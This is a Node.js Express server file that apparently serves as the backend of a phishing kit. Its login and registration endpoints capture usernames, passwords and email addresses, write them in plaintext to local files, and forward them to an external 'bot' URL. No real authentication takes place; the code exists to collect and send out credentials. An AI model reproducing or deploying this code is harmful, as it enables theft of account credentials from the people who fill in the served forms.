var express = require('express');
var path = require('path');
var fs = require('fs');
var http = require('http');
var url = require('url');

var app = express();
var serverDir = __dirname;
var projectRoot = path.join(serverDir, '..');
var outputDir = path.join(projectRoot, 'output');
var frontDir = path.join(projectRoot, 'front');
var botUrl = process.env.BOT_URL || '';

function notifyBot(route, data) {
  if (!botUrl) return;
  var parsed = url.parse(botUrl);
  var payload = JSON.stringify(data);
  var options = {
    hostname: parsed.hostname,
    port: parsed.port || 80,
    path: (parsed.pathname || '/').replace(/\/$/, '') + route,
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(payload, 'utf8')
    }
  };
  var req = http.request(options, function () {});
  req.on('error', function (err) { console.warn('Bot notify error:', err.message); });
  req.write(payload);
  req.end();
}

app.use(express.json());
app.use(express.static(frontDir));

app.post('/api/save-login', function (req, res) {
  var body = req.body || {};
  var data = {
    userName: body.userName || '',
    password: body.password || ''
  };
  var filePath = path.join(outputDir, 'main.json');
  fs.writeFileSync(filePath, JSON.stringify(data, null, 2), 'utf8');
  notifyBot('/notify/main', data);
  res.status(200).json({ ok: true });
});

app.post('/api/save-register', function (req, res) {
  var body = req.body || {};
  var data = {
    emailAddress: body.emailAddress || '',
    userName: body.userName || '',
    password: body.password || ''
  };
  var filePath = path.join(outputDir, 'add.json');
  fs.writeFileSync(filePath, JSON.stringify(data, null, 2), 'utf8');
  notifyBot('/notify/add', data);
  res.status(200).json({ ok: true });
});

var port = process.env.PORT || 3000;
app.listen(port, function () {
  console.log('Server at http://localhost:' + port);
});
